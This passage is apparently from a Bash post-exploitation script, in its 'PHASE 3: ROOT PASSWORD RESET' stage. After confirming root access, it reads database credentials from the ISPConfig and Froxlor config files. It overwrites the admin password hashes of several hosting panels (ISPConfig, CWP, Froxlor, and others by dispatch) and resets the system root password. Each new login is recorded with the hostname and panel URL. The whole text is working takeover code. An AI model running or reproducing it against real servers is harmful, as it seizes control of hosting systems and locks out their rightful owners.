    local conf="/usr/local/ispconfig/server/lib/config.inc.php"
    if [[ -f "$conf" ]]; then
        local db_host=$(run_cmd grep "db_host" "$conf" 2>/dev/null | grep -oP"'[^']+'" | tail -1 | tr -d "'")
        local db_name=$(run_cmd grep "db_database" "$conf" 2>/dev/null | grep -oP "'[^']+'" | tail -1 | tr -d "'")
        local db_user=$(run_cmd grep "db_user" "$conf" 2>/dev/null | grep -oP "'[^']+'" | tail -1 | tr -d "'")
        local db_pass=$(run_cmd grep "db_password" "$conf" 2>/dev/null | grep -oP "'[^']+'" | tail -1 | tr -d "'")
        
        local hash=$(run_cmd php -r "echo crypt('${NEW_PASS}', '\$6\$rounds=5000\$' . bin2hex(random_bytes(8)) . '\$');" 2>/dev/null)
        [[ -z "$hash" ]] && hash=$(run_cmd openssl passwd -6 "${NEW_PASS}" 2>/dev/null)
        
        if [[ -n "$hash" && -n "$db_name" ]]; then
            run_cmd mysql -u"${db_user}" -p"${db_pass}" "${db_name}" -e "UPDATE sys_user SET passwort='${hash}' WHERE username='admin'" 2>/dev/null && {
                log_ok "ISPConfig admin: ${G}${NEW_PASS}${N}"
                log_result "ISPConfig|admin|${NEW_PASS}|https://$(hostname):8080"
            }
        fi
    fi
    
    echo "root:${NEW_PASS}" | run_cmd chpasswd 2>/dev/null && {
        log_ok "System root: ${G}${NEW_PASS}${N}"
        log_result "SSH Root|root|${NEW_PASS}|$(hostname)"
    }
}

root_reset_cwp() {
    log_info "Resetting CWP password..."
    
    # CWP stores in MySQL
    local hash=$(run_cmd php -r "echo md5('${NEW_PASS}');" 2>/dev/null)
    run_cmd mysql -e "UPDATE root_cwp.user SET password='${hash}' WHERE username='root'" 2>/dev/null && {
        log_ok "CWP admin: ${G}${NEW_PASS}${N}"
        log_result "CWP|root|${NEW_PASS}|https://$(hostname):2031"
    }
    
    echo "root:${NEW_PASS}" | run_cmd chpasswd 2>/dev/null && {
        log_ok "System root: ${G}${NEW_PASS}${N}"
        log_result "SSH Root|root|${NEW_PASS}|$(hostname)"
    }
}

root_reset_froxlor() {
    log_info "Resetting Froxlor password..."
    
    local conf="/var/www/froxlor/lib/userdata.inc.php"
    [[ ! -f "$conf" ]] && conf="/var/www/froxlor/config/userdata.inc.php"
    
    if [[ -f "$conf" ]]; then
        local db_host=$(run_cmd grep "sql_host" "$conf" 2>/dev/null | grep -oP "'[^']+'" | tail -1 | tr -d "'")
        local db_name=$(run_cmd grep "sql_db" "$conf" 2>/dev/null | grep -oP "'[^']+'" | tail -1 | tr -d "'")
        local db_user=$(run_cmd grep "sql_user" "$conf" 2>/dev/null | grep -oP "'[^']+'" | tail -1 | tr -d "'")
        local db_pass=$(run_cmd grep "sql_password" "$conf" 2>/dev/null | grep -oP "'[^']+'" | tail -1 | tr -d "'")
        
        local hash=$(run_cmd php -r "echo password_hash('${NEW_PASS}', PASSWORD_BCRYPT);" 2>/dev/null)
        
        if [[ -n "$hash" && -n "$db_name" ]]; then
            run_cmd mysql -u"${db_user}" -p"${db_pass}" "${db_name}" -e "UPDATE panel_admins SET password='${hash}' WHERE loginname='admin'" 2>/dev/null && {
                log_ok "Froxlor admin: ${G}${NEW_PASS}${N}"
                log_result "Froxlor|admin|${NEW_PASS}|https://$(hostname)/froxlor"
            }
        fi
    fi
    
    echo "root:${NEW_PASS}" | run_cmd chpasswd 2>/dev/null && {
        log_ok "System root: ${G}${NEW_PASS}${N}"
        log_result "SSH Root|root|${NEW_PASS}|$(hostname)"
    }
}

root_reset() {
    log_section "PHASE 3: ROOT PASSWORD RESET"
    log_ok "Root access confirmed. Resetting panel passwords..."
    
    case "$PANEL" in
        cpanel)       root_reset_cpanel ;;
        plesk)        root_reset_plesk ;;
        cyberpanel)   root_reset_cyberpanel ;;
        directadmin)  root_reset_directadmin ;;
        hestia)       root_reset_hestia ;;
        vesta)        root_reset_vesta ;;
        aapanel)      root_reset_aapanel ;;
        cloudpanel)   root_reset_cloudpanel ;;
        webmin)       root_reset_webmin ;;
        ispconfig)    root_reset_ispconfig ;;
        cwp)          root_reset_cwp ;;
        froxlor)      root_reset_froxlor ;;
        *)
            log_warn "Unknown panel. Trying all methods..."
            echo "root:${NEW_PASS}" | run_cmd chpasswd 2>/dev/null && {
                log_ok "System root: ${G}${NEW_PASS}${N}"
                log_result "SSH Root|root|${NEW_PASS}|$(hostname)"
            }
            ;;
    esac
    
    SUCCESS=1
}

